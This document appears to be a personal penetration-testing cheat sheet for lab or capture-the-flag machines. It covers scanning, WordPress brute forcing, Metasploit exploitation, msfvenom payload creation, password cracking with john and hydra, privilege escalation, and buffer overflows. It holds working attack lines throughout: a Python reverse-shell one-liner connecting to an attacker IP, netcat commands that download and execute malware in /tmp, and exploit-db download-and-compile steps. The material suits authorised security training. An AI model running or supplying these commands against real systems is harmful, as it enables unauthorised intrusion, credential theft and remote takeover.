# Find target:
arp-scan -l

# modify /etc/hosts if necessary to give ip a url name

# determine open ports:
nmap -p- (-sU -sT) -T4 -A <ip>  # -sU scans for UDP ports (very slow!), -sT for TCP ports (default behavior)

### Vulnerability analysis

nikto --host=http://<ip>
dirb http://<ip>

# Wordpress?
wpscan --url http://<ip> --no-update -e
# brute force login:
wpscan --url http://<ip> --no-update --usernames <usernames> --passwords <passwordlist.txt>
# if in, upload a phpbash, then look for wp-config.php to get credentials to the MySQL server, which is usually accessed by a phpmyadmin directory
# use john on wp-users password hashes

# Metasploit
searchsploit <opened port's service or any service really!, ex. ProFTPD 1.3.3c>
msfconsole
search <port service>
use <found exploit>
show payloads
set payload <payload, ex. cmd/unix/reverse_perl>
set lhost <attack ip>
set rhost <target ip>
run
# if uploading malware
msfvenom --platform <platform, ex. linux> -p <payload, ex. linux/x86/meterpreter/reverse_tcp> LPORT=<attack port> LHOST=<attack ip> -f elf -o <malware name>
# on attack machine:
nc -lvvp <attack port> < <malware file>
msfconsole
use exploit/multi/handler
set payload <corresponding attack-side payload, ex. linux/x86/meterpreter/reverse_tcp>
set lhost <attack ip>
set lport <attack port>
run
# on target machine:
nc <attack ip> <attack port> > /tmp/<malware name>; chmod 777 /tmp/<malware name>; /tmp/<malware name>
# in meterpreter environment
upload <path to local analysis script> /tmp/<malware name>

# Password cracking
# cracking SSH RSA passphrases
ssh2john <rsakey> > <rsa2johnfile>
john --show (-wordlist=/usr/share/wordlists/rockyou.txt) (-format=SSH) <rsa2johnfile> # () are optional
# generate password list from words on website
cewl -w cewl.txt http://<target ip>/<webpage>
wc -l cewl.txt # check word-count
# hydra
hydra -L users.txt -P pass.txt -f -e nsr -o hydra.txt -t 4 -V ssh://<target ip>
# -f is stop on success, -e nsr is use null, login, and reverse login as passwords, -t is number of connects in parallel, -V to list login attemps

# Android
# connect through adb, steps are setup adb server on attacker, initialize daemon on target, and get shell
msf> use android/adb/adb_server_exec
adb connect 10.0.0.5
adb shell

### Privesc

# Find usable files:
id
sudo -l
find / -group <group-name> -type f 2>/dev/null
# find executable binaries:
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -print 2>/dev/null
# find files belonging to a user
find / -user <username> -type f 2>/dev/null
# find root executables that can be ran by anyone
find / -user root -perm -o=x -type f 2>/dev/null | grep <python/perl/ruby> # use these with a netcat reverse shell

# Check SSH startup scripts
ls -alh /etc/update-motd.d
# look for something with "header", these scripts will run as root

# Python one-liners
python -c 'import pty; pty.spawn("/bin/sh")' OR "/bin/bash"
# ssh environment
# on target:
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attack ip>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
# on attacker:
nc -lvvp 1234

# Exploitdb
# use linux-exploit-suggester (https://github.com/mzet-/linux-exploit-suggester), find an available url with extension, and run on target machine (scp over source code if necessary)
wget -O exploit.<ext> https://www.exploit-db.com/download/*.*
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o <exploit name> <exploit script>.* -lutil
gcc -pthread -o <exploit name> <exploit script>.* -lcrypt

# Buffer overflow
objdump -d <executable> # to look for "lea" buffer assignments, and use -0x##(%ebp),%eax + 4 (for ebp value) to replace an instruction address pointer
# otherwise, just overflow the assigned source code buffer size to replace the contents of the variable declared right before
# spawn /bin/sh rather than /bin/bash, as /bin/bash has more protections

### ETC

# POP3 commands
user <username>
pass <password>
list
retr <#>

# pcap is for Wireshark, use the search function to look for the relevant URL, and then follow that tcp stream
